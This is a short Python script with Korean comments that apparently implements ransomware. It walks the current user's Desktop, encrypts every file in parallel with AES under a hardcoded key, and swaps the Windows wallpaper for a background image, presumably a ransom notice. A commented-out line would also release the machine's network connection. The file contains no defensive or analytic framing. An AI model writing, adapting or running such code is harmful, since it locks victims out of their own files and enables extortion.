import AEScipher
#유저의 login name을 return 해주는 함수
from getpass import getuser
from ctypes import windll
from os import system, getcwd,walk
from multiprocessing import Pool,cpu_count

def SendForEnception(filename):		
    try:
            a.encrypt_file(filename)
            print(filename+"=success encryption.")
    except (PermissionError, ValueError):
        pass
    
userPath='/Users/name/Desktop'.replace('name',getuser())
key="김건욱"
a=AEScipher.AEScipher(key)


if __name__=='__main__':	
    #파일명을 모두 뽑아온다. 
    filelist=[]
    for (path, dir, files) in walk(userPath):
        for filename in files:
            filelist.append(path+'/'+filename)
		
    #cpu 코어 개수만큼 프로세스를 만든다.		
    process=Pool(cpu_count())

    #SendForException 함수에 들어갈 인자를 맵핑 시킨다.
    process.map(SendForEnception,tuple(filelist))

    #자원 낭비를 방지하기 위해 close 호출 및 작업 완료 대기를  위해 join 함수 호출
    process.close()
    process.join()

    imgPath=getcwd()+"\\background.jpg"
    windll.user32.SystemParametersInfoW(20, 0,imgPath, 0)
    #system("ipconfig/release")


